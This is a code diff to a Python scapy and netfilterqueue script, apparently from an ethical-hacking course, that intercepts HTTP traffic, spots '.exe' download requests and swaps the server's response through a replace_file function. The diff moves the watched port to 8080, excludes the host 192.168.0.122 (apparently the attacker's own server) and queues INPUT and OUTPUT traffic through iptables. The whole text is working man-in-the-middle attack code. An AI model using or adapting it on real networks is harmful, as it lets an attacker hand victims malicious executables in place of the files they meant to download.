@@ -13,11 +13,14 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         try:
 
-            if scapy_packet[scapy.TCP].dport == 80:
-                if ".exe" in str(scapy_packet[scapy.Raw].load.decode()):
+            if scapy_packet[scapy.TCP].dport == 8080:
+                if (
+                    ".exe" in str(scapy_packet[scapy.Raw].load.decode())
+                    and "192.168.0.122" not in scapy_packet[scapy.Raw].load
+                ):
                     print("[+].exe Request")
                     ack_list.append(scapy_packet[scapy.TCP].ack)
-            elif scapy_packet[scapy.TCP].sport == 80:
+            elif scapy_packet[scapy.TCP].sport == 8080:
                 if scapy_packet[scapy.TCP].seq in ack_list:
                     scapy_packet = replace_file(scapy_packet)
                     packet.set_payload(bytes(scapy_packet))
@@ -41,7 +44,8 @@ def replace_file(scapy_packet):
 
 def create_iptables_queue():
     print("[+]Creating iptables queue")
-    subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
+    subprocess.run(["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "1"])
+    subprocess.run(["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "1"])
     print("[+]Done")
 
 
